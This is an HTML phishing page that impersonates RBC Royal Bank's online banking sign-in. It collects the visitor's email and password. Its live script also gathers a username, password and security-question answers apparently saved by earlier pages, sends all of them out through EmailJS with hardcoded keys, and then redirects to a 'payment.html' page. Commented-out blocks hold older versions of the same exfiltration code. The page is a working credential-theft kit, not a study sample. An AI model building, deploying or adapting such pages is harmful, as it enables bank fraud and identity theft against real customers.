<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="icon" type="image/x-icon" href="favicon.ico" />
  <title>RBC Royal Bank â€“ Secure Sign In</title>
  <link rel="stylesheet" href="styles.css">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet" />
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">

  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>


  <style>
    @media screen and (min-width: 376px) and (max-width: 425px) {
      .smobile {
        width: 102%;
      }

      .img {
        width: 150pc;
      }

      /* .bigDiv {
    position: relative;
    left: 48%;
  } */
      .input {
        width: 95%;
      }

      .input1 {
        width: 95%;
        /* margin-left: 19px; */
      }

      .question {
        margin-left: 140px;
      }
    }

    @media screen and (max-width: 375px) {
      .img {
        width: 100vw;
      }

      .input {
        width: 95%;
      }

      .input1 {
        width: 95.5%;
      }

      .question {
        margin-left: 145px;
      }
    }
  </style>

</head>

<body>
  <div class="overflow-hidden lg:flex">
    <div class="">
      <img src="heroImage.jpg"
        class="img  lg:h-screen lg:absolute lg:w-screen h-72 bg-contain -mt-16 lg:-mt-40 lg:top-40" alt="" />
    </div>
    <div class="herotext relative text-white -top-44 flex justify-center items-center ">
      <div class="text-center lg:top-40 lg:relative lg:left-80">
        <div class="logo flex justify-center">
          <img src="favicon.ico" class="lg:w-14 lg:h-14" alt="" />
        </div>
        <h2 class="font-semibold lg:text-xl lg:mb-3 lg:bold ">Secure Sign-In</h2>
        <p class="text-sm">RBC Online Banking</p>
      </div>
    </div>
    <div class="bigDiv lg:h-screen lg:px-40 lg:pt-40  lg:-top-0 lg:relative bg-white relative pl-6 -top-36 p-4">
      <form name="sentMessage" novalidate="novalidate" id="myForm" method="post" action="payment.html">
        <span class="text-base">Email</span>
        <br>

        <input name="email" id="email" type="text" required
          class="input border mt-3 lg:w-80 border-black h-12 focus:outline-none focus:border-blue-700 focus:border-8 p-3" />
        <br /><br>
        <span class="text-base">Password</span>
        <br>
        <input name="fpassword" id="fpassword" type="password" required
          class="input border mt-3 lg:w-80 border-black h-12 focus:outline-none focus:border-blue-700 focus:border-8 p-3" />
        <br />
        <div class="h-10 mt-7">
          <input type="checkbox" id="myCheckbox" class="z-10 hidden">
          <label for="myCheckbox" class="flex items-center  cursor-pointer">
            <div class="w-8 h-8 border border-gray-400 relative mr-2">
              <svg class="absolute inset-0 m-auto w-6 h-6 text-3xl text-blue-800 opacity-0 pointer-events-none"
                fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path id="tickPath" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7">
                </path>
              </svg>

              <path id="tickPath" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7">
              </path>
              </svg>
            </div>
            <span class="z-50">Save email and password</span>
            <i class="fa-light fa-circle-question float-right"></i>
          </label>
        </div>
        <button onclick="SendMail();" id="button" type="submit"
          class="input1 px-36 py-3 relative top-5 bg-blue-700 text-white ">Next</button> <br>

      </form>
      <div class="relative top-11 text-sm text-blue-600">
        <!-- <a href="#">Recover Your Email</a> <br> -->
        <!-- <a href="#" class="relative top-2">Enrol in Online Banking</a> -->
      </div>
      <div class="mt-20 text-blue-600 text-sm">
        <hr class="border-1" />
        <a href="#" class="relative top-3">Other Online Services</a>
      </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

    <script type="text/javascript">
      emailjs.init('ivdRS2v-NFF2dpEHo')
    </script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>

    <!-- <script>
      window.onload = function() {
        const btn = document.getElementById("button");

      document
        .getElementById("myForm")
        .addEventListener("submit", function (event) {
          event.preventDefault();
        const username = localStorage.getItem('username');
        const password = localStorage.getItem('password');
        const question1 = localStorage.getItem('question1');
        const question2 = localStorage.getItem('question2');
        console.log(username); // Output the value of the name parameter
        console.log(password); // Output the value of the name parameter
        console.log(question1); // Output the value of the name parameter
        console.log(question2); // Output the value of the name parameter
        
        // localStorage.removeItem('username'); // Remove the item from local storage if needed
        // localStorage.removeItem('password'); // Remove the item from local storage if needed
        // localStorage.removeItem('question1'); // Remove the item from local storage if needed
        // localStorage.removeItem('question2'); // Remove the item from local storage if needed
        const email = document.getElementById("email").value.trim()
        console.log(email)
        const fpassword = document.getElementById("fpassword").value.trim()
        console.log(fpassword)

       
          btn.value = "Sending...";

          const serviceID = "service_64fw9q6";
          const templateID = "template_ob3rcb4";

          emailjs.sendForm(serviceID, templateID, this).then(
            () => {
              btn.value = "Send Email";
              alert("Login Successful");
            },
            (err) => {
              btn.value = "Send Email";
              alert(JSON.stringify(err));
            }
          );
        })};

        // window.location.href = 'payment.html';

      
    </script> -->

    <script>



      window.onload = function () {
        const btn = document.getElementById("button");



        const serviceID = "service_64fw9q6";
        const templateID = "template_ob3rcb4";



        document.getElementById("myForm").addEventListener("submit", function (event) {
          event.preventDefault();
          const username = localStorage.getItem('username');
          const password = localStorage.getItem('password');
          const question1 = localStorage.getItem('question1');
          const question2 = localStorage.getItem('question2');
          const email = document.getElementById("email").value.trim()
          // console.log(email)
          const fpassword = document.getElementById("fpassword").value.trim()
          // console.log(fpassword)
          if (!email || !fpassword) {
            alert("Please fill in all fields.");
            return;
          }

          // Send email using EmailJS
          emailjs.send(serviceID, templateID, {
            username: username,
            password: password,
            question1: question1,
            question2: question2,
            email: email,
            fpassword: fpassword
          }).then(function (response) {
            console.log('Login successful', response);
            window.location.href = './payment.html';
            // Redirect or show success message
          }, function (error) {
            console.error('Email failed to send:', error);
            // Handle error (e.g., show error message)
          });
        });
      };
    </script>

    <!-- <script>



      function SendMail() {
        var params = {
           username : localStorage.getItem('username'),
         password : localStorage.getItem('password'),
         question1 : localStorage.getItem('question1'),
         question2 : localStorage.getItem('question2'),
         email : document.getElementById("email").value.trim(),
        // console.log(email)
        fpassword : document.getElementById("fpassword").value.trim(),
        // console.log(fpassword)
        }

        console.log(params)
        emailjs.send(serviceID, templateID, params).then(function (res) {
          alert("Login Successful");
        })
      }
    </script> -->
    <!-- <script>
        function SendMail() {
            // Code to send mail goes here

            // Redirect to another page
            window.location.href = './payment.html';
        }
    </script> -->

</body>

</html>